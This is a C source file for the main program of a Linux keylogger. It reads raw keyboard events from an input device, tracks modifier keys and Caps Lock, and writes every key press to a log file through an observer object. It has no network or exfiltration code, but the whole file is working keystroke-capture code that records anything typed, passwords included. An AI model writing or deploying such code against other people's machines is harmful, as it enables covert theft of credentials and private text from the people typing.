#include <fcntl.h>
#include <linux/input-event-codes.h>
#include <linux/input.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#include "behavior_subject.h"
#include "keylogger.h"

static volatile sig_atomic_t keep_running = true;

void notify_key(const char *key);
void signal_handler();

int main(int argc, char *argv[]) {
    const char *target_device_name = NULL;
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--dev") == 0 && i + 1 < argc) {
            target_device_name = argv[i + 1];
        }
    }

    char *keyboard_path = find_keyboard_device(target_device_name);
    if (!keyboard_path) {
        fprintf(stderr, "No keyboard device found");
        if (target_device_name) {
            fprintf(stderr, " with name: %s\n", target_device_name);
        } else {
            fprintf(stderr, "\n");
        }
        return EXIT_FAILURE;
    }

    printf("Using keyboard device: %s\n", keyboard_path);

    FILE *fp = fopen(LOG_FILE, "w");
    if (!fp) {
        perror("Cannot open log file");
        return EXIT_FAILURE;
    }

    int fd = open(keyboard_path, O_RDONLY);
    if (fd == -1) {
        perror("Cannot open keyboard device");
        fclose(fp);
        return EXIT_FAILURE;
    }

    struct input_event event;
    bool shift_pressed = false, ctrl_pressed = false, meta_pressed = false, alt_pressed = false,
         capslock_active = false;

    BehaviorSubject subject;
    init_behavior_subject(&subject, "SKIP");
    subscribe(&subject, notify_key);

    signal(SIGTERM, signal_handler);
    signal(SIGINT, signal_handler);

    char state_key_name[16];
    while (keep_running) {
        ssize_t bytes_read = read(fd, &event, sizeof(event));
        if (bytes_read == sizeof(event)) {
            if (event.type == EV_KEY) {
                state_key_name[0] = '\0';
                // Update status modifier keys
                if (event.code == KEY_LEFTSHIFT || event.code == KEY_RIGHTSHIFT) {
                    shift_pressed = event.value;
                } else if (event.code == KEY_LEFTCTRL || event.code == KEY_RIGHTCTRL) {
                    ctrl_pressed = event.value;
                } else if (event.code == KEY_LEFTMETA || event.code == KEY_RIGHTMETA) {
                    meta_pressed = event.value;
                } else if (event.code == KEY_LEFTALT || event.code == KEY_RIGHTALT) {
                    alt_pressed = event.value;
                }
                // Log modifier keys independently
                if (event.value == 1) {
                    if (event.code == KEY_CAPSLOCK) {
                        capslock_active = !capslock_active;
                    }
                    if (event.code == KEY_LEFTSHIFT || event.code == KEY_RIGHTSHIFT) {
                        strcat(state_key_name, "Shift");
                    } else if (event.code == KEY_LEFTCTRL || event.code == KEY_RIGHTCTRL) {
                        strcat(state_key_name, "Ctrl");
                    } else if (event.code == KEY_LEFTMETA || event.code == KEY_RIGHTMETA) {
                        strcat(state_key_name, "Meta");
                    } else if (event.code == KEY_LEFTALT || event.code == KEY_RIGHTALT) {
                        strcat(state_key_name, "Alt");
                    }
                    if (state_key_name[0] != '\0') {
                        log_key(fp, &subject, ctrl_pressed, meta_pressed, alt_pressed, state_key_name);
                    }
                    // Log other keys
                    const char *key_name = get_key_name(event.code, shift_pressed, capslock_active);
                    if (strcmp(key_name, "UNKNOWN") != 0) {
                        strcat(state_key_name, key_name);
                        log_key(fp, &subject, ctrl_pressed, meta_pressed, alt_pressed, state_key_name);
                    }
                }
            }
        } else if (bytes_read == -1) {
            memset(state_key_name, 0, 16);
            break;
        }
    }

    unsubscribe(&subject);
    close(fd);
    fclose(fp);

    return EXIT_SUCCESS;
}

void notify_key(const char *key) {
    if (strcmp(key, "SKIP") == 0) {
        return;
    }
    // printf("%s\n", key);
}

void signal_handler() { keep_running = false; }
